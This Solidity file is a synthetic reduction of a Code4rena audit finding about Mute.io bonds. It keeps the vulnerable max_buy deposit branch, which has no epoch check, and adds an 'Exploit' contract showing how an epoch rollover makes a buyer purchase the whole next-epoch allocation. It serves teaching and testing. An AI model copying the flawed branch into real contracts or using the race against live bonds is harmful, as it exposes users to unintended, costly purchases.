// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Mute.Io — Bond max-buyer might end up buying the max buy of the next epoch
    (Code4rena 2023-03-mute, finding #16038, H-01)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: MuteBond.deposit(max_buy=true) uses maxPurchaseAmount() /
    maxDeposit() for the CURRENT epoch with no epoch-id check. If the epoch
    rolls between intent and inclusion, the buyer silently purchases the full
    next-epoch allocation at a worse price.

    Vulnerable max_buy branch preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced MuteBond — deposit path + epoch rollover only.
/// Source: contracts/bonds/MuteBond.sol @ 4d8b13a L153-L200.
contract MuteBond {
    MockERC20 public immutable lpToken;
    MockERC20 public immutable muteToken;

    uint256 public maxPayout; // max MUTE sold per epoch
    uint256 public bondPriceFixed; // simplified constant price (1e18 = 1:1)
    uint256 public epoch;
    uint256 public lastPayout; // payout of the most recent deposit (for harm assert)

    struct BondTerms {
        uint256 bondTotal;
        uint256 payoutTotal;
        uint256 lastTimestamp;
    }

    BondTerms[] public terms;

    constructor(MockERC20 _lp, MockERC20 _mute, uint256 _maxPayout) {
        lpToken = _lp;
        muteToken = _mute;
        maxPayout = _maxPayout;
        bondPriceFixed = 1e18; // 1 LP : 1 MUTE
        terms.push(BondTerms(0, 0, 0));
    }

    function bondPrice() public view returns (uint256) {
        return bondPriceFixed;
    }

    function maxDeposit() public view returns (uint256) {
        return maxPayout - terms[epoch].payoutTotal;
    }

    function maxPurchaseAmount() public view returns (uint256) {
        return (maxDeposit() * 1e18) / bondPrice();
    }

    function payoutFor(uint256 value) public view returns (uint256) {
        return (bondPrice() * value) / 1e18;
    }

    /**
     *  @notice purchase a bond with LP
     *  @param value uint
     *  @param _depositor address
     *  @param max_buy bool
     */
    function deposit(uint256 value, address _depositor, bool max_buy) external returns (uint256) {
        // amount of mute tokens
        uint256 payout = payoutFor(value);
        if (max_buy == true) {
            value = maxPurchaseAmount(); // @> VULN: no epoch pin — silently uses whatever the current epoch's remaining max is
            payout = maxDeposit(); // FIX: require(userEpoch == epoch) or pass expectedEpoch
        } else {
            require(payout >= ((10 ** 18) / 100), "Bond too small");
            require(payout <= maxPayout, "Bond too large");
            require(payout <= maxDeposit(), "Deposit too large");
        }

        // pull LP, pay MUTE
        lpToken.transferFrom(msg.sender, address(this), value);
        muteToken.mint(_depositor, payout);
        lastPayout = payout;

        terms[epoch].payoutTotal = terms[epoch].payoutTotal + payout;
        terms[epoch].bondTotal = terms[epoch].bondTotal + value;
        terms[epoch].lastTimestamp = block.timestamp;

        // exhausted this bond, issue new one
        if (terms[epoch].payoutTotal == maxPayout) {
            terms.push(BondTerms(0, 0, 0));
            epoch++;
        }

        return payout;
    }

    /// @dev Seed prior purchases into the current epoch (setup helper).
    function seedEpochFilled(uint256 alreadyPaid) external {
        require(alreadyPaid <= maxPayout, "over");
        terms[epoch].payoutTotal = alreadyPaid;
    }
}

/// CREATE: lp(1), mute(2), bond(3)
contract Exploit {
    MockERC20 public lp;
    MockERC20 public mute;
    MuteBond public bond;

    uint256 public constant MAX_PAYOUT = 100 ether; // "100 wad"
    uint256 public constant INTENDED = 1 ether; // remaining 1% = "1 wad"
    uint256 public victimPayout;
    uint256 public victimEpochAtIntent;
    uint256 public epochAfter;

    constructor() {
        lp = new MockERC20();
        mute = new MockERC20();
        bond = new MuteBond(lp, mute, MAX_PAYOUT);
    }

    function run() external {
        // Epoch 0 is 99% filled — remaining maxDeposit = 1 ether (victim's intent)
        bond.seedEpochFilled(MAX_PAYOUT - INTENDED);
        require(bond.maxDeposit() == INTENDED, "setup remaining");
        require(bond.epoch() == 0, "epoch0");

        // Victim observes remaining = 1 and intends max_buy of that remainder.
        victimEpochAtIntent = bond.epoch();
        uint256 expectedIfNoFlip = bond.maxDeposit();
        require(expectedIfNoFlip == INTENDED, "intent");

        // Before victim's max_buy is included, an innocent/attacker purchase exhausts
        // the remaining 1 and rolls the epoch (mempool race / frontrun).
        lp.mint(address(this), INTENDED + MAX_PAYOUT + 1);
        lp.approve(address(bond), type(uint256).max);
        bond.deposit(0, address(this), true); // max_buy of remaining 1 → epoch++
        require(bond.epoch() == 1, "epoch rolled");
        require(bond.maxDeposit() == MAX_PAYOUT, "next epoch full");

        // Victim's max_buy now lands — no epoch pin, so they buy the FULL next epoch
        bond.deposit(0, address(this), true);
        victimPayout = bond.lastPayout();
        epochAfter = bond.epoch();

        // HARM: victim intended 1 wad of epoch 0, received 100 wad of epoch 1
        require(victimPayout == MAX_PAYOUT, "harm: did not buy full next epoch");
        require(victimPayout > expectedIfNoFlip, "harm: not larger than intent");
        require(victimEpochAtIntent == 0 && epochAfter == 2, "harm: epochs");
        // epochAfter == 2 because full next-epoch purchase also exhausts epoch 1
    }
}
